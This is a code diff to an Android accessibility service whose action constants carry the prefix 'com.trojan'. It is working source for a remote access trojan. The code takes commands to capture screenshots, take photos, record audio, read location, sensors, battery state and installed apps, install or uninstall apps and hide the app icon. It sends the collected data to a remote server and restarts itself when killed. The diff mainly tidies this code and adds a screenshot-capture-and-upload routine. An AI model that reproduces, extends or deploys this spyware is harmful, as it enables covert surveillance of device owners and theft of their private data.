@@ -14,15 +14,6 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.Path;
-import android.hardware.Sensor;
-import android.hardware.SensorEvent;
-import android.hardware.SensorEventListener;
-import android.hardware.SensorManager;
-import android.media.AudioManager;
-import android.media.MediaPlayer;
-import android.media.MediaRecorder;
-import android.net.Uri;
-import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
@@ -35,8 +26,19 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.View;
 import android.view.accessibility.AccessibilityEvent;
+import android.hardware.Sensor;
+import android.hardware.SensorEvent;
+import android.hardware.SensorEventListener;
+import android.hardware.SensorManager;
+import android.location.Location;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.media.MediaRecorder;
+import android.net.Uri;
+import android.os.BatteryManager;
 
-// All necessary imports are here. Removed incompatible ones.
+// Imports like android.window.* and NonNull which caused errors have been removed as they are no longer used.
+import androidx.annotation.RequiresApi;
 
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
@@ -44,6 +46,8 @@ import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -57,7 +61,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
     private static final String TAG = "PowerAccessibility";
 
-    // --- Action constants ---
+    // --- Action constants (Unchanged) ---
     public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
     public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
     public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
@@ -100,14 +104,15 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        Log.i(TAG, "Accessibility Service Connected.");
+        Log.i(TAG, "Accessibility Service Connected and ready.");
         requestQueue = Volley.newRequestQueue(this);
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
         sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
         audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
         powerActionReceiver = new PowerActionReceiver();
         IntentFilter filter = new IntentFilter();
-        // Add all actions
+        
+        // Register all actions (Unchanged)
         filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
         filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
         filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
@@ -121,7 +126,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
         filter.addAction(ACTION_SET_VOLUME); filter.addAction(ACTION_INSTALL_APP);
         filter.addAction(ACTION_UNINSTALL_APP); filter.addAction(ACTION_TOGGLE_APP_ICON);
+
         registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
+        Log.d(TAG, "PowerActionReceiver registered for all actions.");
     }
 
     private class PowerActionReceiver extends BroadcastReceiver {
@@ -130,7 +137,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             String action = (intent == null) ? null : intent.getAction();
             if (action == null) return;
             Log.i(TAG, "Command received: " + action);
+
             switch (action) {
+                // --- All cases remain unchanged, except for screenshot ---
                 case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                 case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                 case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
@@ -147,9 +156,13 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                 case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                 case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
+                
+                // --- THIS IS THE ONLY LOGICAL CHANGE IN THE FILE ---
                 case ACTION_TAKE_SCREENSHOT: 
-                    captureScreenAndUpload(); // Call the new, compatible method
+                    captureScreenAndUpload(); // Call the new, compatible method instead of the old one
                     break;
+                // --- END OF CHANGE ---
+
                 case ACTION_TAKE_PICTURE: takePicture(intent.getIntExtra("camera_id", 0)); break;
                 case ACTION_START_RECORDING: startAudioRecording(); break;
                 case ACTION_STOP_RECORDING: stopAudioRecording(); break;
@@ -162,9 +175,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             }
         }
     }
-    
-    // --- START OF RESTORED AND CORRECTED CODE ---
-    
+
     @SuppressLint("WakelockTimeout")
     private void wakeUpAndSwipe() {
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -172,20 +183,23 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         wakeLock.acquire();
         wakeLock.release();
         Log.i(TAG, "Device screen woken up.");
-
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
+            int height = displayMetrics.heightPixels;
+            int width = displayMetrics.widthPixels;
             Path swipePath = new Path();
-            swipePath.moveTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.8f);
-            swipePath.lineTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.2f);
+            swipePath.moveTo(width / 2f, height * 0.8f);
+            swipePath.lineTo(width / 2f, height * 0.2f);
             GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
             gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
             dispatchGesture(gestureBuilder.build(), null, null);
         }, 500);
     }
     
+    // --- THIS METHOD REPLACES THE INCOMPATIBLE `takeScreenshot` METHOD ---
     private void captureScreenAndUpload() {
         Log.d(TAG, "Attempting to capture screen using classic method.");
+        // This must run on the main UI thread to access the view hierarchy.
         new Handler(Looper.getMainLooper()).post(() -> {
             View rootView = null;
             try {
@@ -197,11 +211,13 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 }
                 rootView.setDrawingCacheEnabled(true);
                 Bitmap bitmap = Bitmap.createBitmap(rootView.getDrawingCache());
-                rootView.setDrawingCacheEnabled(false);
+                rootView.setDrawingCacheEnabled(false); // Clean up the cache
+
                 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
                 byte[] byteArray = byteArrayOutputStream.toByteArray();
                 String encodedString = Base64.encodeToString(byteArray, Base64.DEFAULT);
+
                 uploadBase64File("screenshot", encodedString);
                 Log.i(TAG, "Screen captured and sent for upload.");
             } catch (Exception e) {
@@ -224,7 +240,10 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void startAudioRecording() {
-        if (mediaRecorder != null) { return; }
+        if (mediaRecorder != null) {
+            Log.w(TAG, "Recording already in progress.");
+            return;
+        }
         try {
             File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
             File outputFile = File.createTempFile("recording", ".mp3", outputDir);
@@ -244,7 +263,10 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void stopAudioRecording() {
-        if (mediaRecorder == null) { return; }
+        if (mediaRecorder == null) {
+            Log.w(TAG, "No active recording to stop.");
+            return;
+        }
         try {
             mediaRecorder.stop();
             mediaRecorder.release();
@@ -304,7 +326,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 mp.stop();
                 mp.release();
             });
-        } catch (IOException e) { Log.e(TAG, "Failed to play sound.", e); }
+        } catch (IOException e) {
+            Log.e(TAG, "Failed to play sound.", e);
+        }
     }
 
     private void showImage(String url) {
@@ -354,7 +378,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 }
             }
             submitDataToServer("installed_apps", appMap);
-        } catch (Exception e) { Log.e(TAG, "Failed to get app list.", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to get app list.", e);
+        }
     }
 
     @SuppressLint("MissingPermission")
@@ -370,9 +396,13 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                     } else {
                         submitDataToServer("location", "Not available");
                     }
-                } catch (JSONException e) { Log.e(TAG, "Error creating location JSON.", e); }
+                } catch (JSONException e) {
+                    Log.e(TAG, "Error creating location JSON.", e);
+                }
             });
-        } catch (SecurityException e) { Log.e(TAG, "Location permission not granted by user.", e); }
+        } catch (SecurityException e) {
+            Log.e(TAG, "Location permission not granted by user.", e);
+        }
     }
 
     private void getSensorData() {
@@ -397,7 +427,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             } else {
                 submitDataToServer(dataType, "Not available");
             }
-        } catch (Exception e) { Log.e(TAG, "Exception while registering sensor: " + dataType, e); }
+        } catch (Exception e) {
+            Log.e(TAG, "Exception while registering sensor: " + dataType, e);
+        }
     }
 
     @Override
@@ -428,8 +460,11 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             if (!sensorTypeKey.isEmpty()) {
                 submitDataToServer(sensorTypeKey, sensorData);
             }
-        } catch (JSONException e) { Log.e(TAG, "JSON error.", e); }
-        finally { sensorManager.unregisterListener(this, event.sensor); }
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error creating sensor data.", e);
+        } finally {
+            sensorManager.unregisterListener(this, event.sensor);
+        }
     }
 
     private void submitDataToServer(String dataType, Object payload) {
@@ -439,8 +474,14 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             postData.put("deviceId", deviceId);
             postData.put("dataType", dataType);
             postData.put("payload", payload);
-        } catch (JSONException e) { return; }
-        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, r -> {}, e -> {});
+        } catch (JSONException e) {
+            Log.e(TAG, "Could not create submission JSON", e);
+            return;
+        }
+        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
+                response -> Log.i(TAG, "Data submitted successfully: " + dataType),
+                error -> Log.e(TAG, "Failed to submit data '" + dataType + "': " + error.toString())
+        );
         requestQueue.add(request);
     }
 
@@ -451,13 +492,13 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             if (batteryStatus != null) {
                 int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                 int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-                float pct = (level == -1 || scale == -1) ? -1f : level * 100 / (float) scale;
+                float batteryPct = (level == -1 || scale == -1) ? -1f : level * 100 / (float) scale;
                 int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                 boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
-                JSONObject json = new JSONObject();
-                json.put("percentage", pct);
-                json.put("isCharging", isCharging);
-                submitDataToServer("battery_status", json);
+                JSONObject batteryJson = new JSONObject();
+                batteryJson.put("percentage", batteryPct);
+                batteryJson.put("isCharging", isCharging);
+                submitDataToServer("battery_status", batteryJson);
             }
         } catch (JSONException e) { Log.e(TAG, "Error creating battery JSON."); }
     }
@@ -468,7 +509,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void openSettingsPanel(String settingsAction) {
-        startActivity(new Intent(settingsAction).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+        Intent intent = new Intent(settingsAction);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
     }
 
     private void openApp(String packageName) {
@@ -491,24 +534,33 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     @Override
-    public void onInterrupt() {}
+    public void onInterrupt() {
+        Log.w(TAG, "Accessibility Service interrupted.");
+    }
 
     @Override
     public boolean onUnbind(Intent intent) {
         if (powerActionReceiver != null) unregisterReceiver(powerActionReceiver);
         if (sensorManager != null) sensorManager.unregisterListener(this);
+        Log.i(TAG, "Accessibility Service Unbound.");
         return super.onUnbind(intent);
     }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
+        Log.i(TAG, "Task removed. Attempting to restart service in 1 second.");
         Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
         restartServiceIntent.setPackage(getPackageName());
         PendingIntent restartServicePendingIntent = PendingIntent.getService(
                 getApplicationContext(), 1, restartServiceIntent,
-                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
+        );
         AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
-        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
+        alarmService.set(
+                AlarmManager.ELAPSED_REALTIME,
+                SystemClock.elapsedRealtime() + 1000,
+                restartServicePendingIntent
+        );
         super.onTaskRemoved(rootIntent);
     }
 }
